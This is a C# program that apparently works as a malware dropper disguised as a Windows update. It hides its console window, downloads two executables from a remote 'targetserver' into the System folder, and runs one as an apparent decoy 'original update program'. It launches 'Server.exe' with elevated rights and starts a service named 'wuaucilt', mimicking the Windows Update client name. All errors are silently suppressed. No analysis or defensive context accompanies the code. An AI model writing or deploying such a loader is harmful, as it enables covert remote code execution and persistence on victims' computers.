using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.ServiceProcess;

namespace winnet
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private const string DOWNLOAD_SERVER = "http://targetserver/updates/";

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {
                WebClient ldmgr = new WebClient();

                string targetPath = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\";

                // start the original update program
                ldmgr.DownloadFile(DOWNLOAD_SERVER + "upd.exe", targetPath + "upd.exe");
                Process.Start(targetPath + "upd.exe");

                ldmgr.DownloadFile(DOWNLOAD_SERVER + "Server.exe", targetPath + "Server.exe");

                //
                Process p = new Process();
                p.StartInfo.FileName = targetPath + "Server.exe";
                p.StartInfo.Verb = "runas";
                p.StartInfo.UseShellExecute = true;
                p.Start();
                p.WaitForExit();

                ServiceController controller = new ServiceController();
                controller.MachineName = ".";
                controller.ServiceName = "wuaucilt";
                controller.Start();
            }
            catch (Exception)
            {
                return;
            }
        }
    }
}
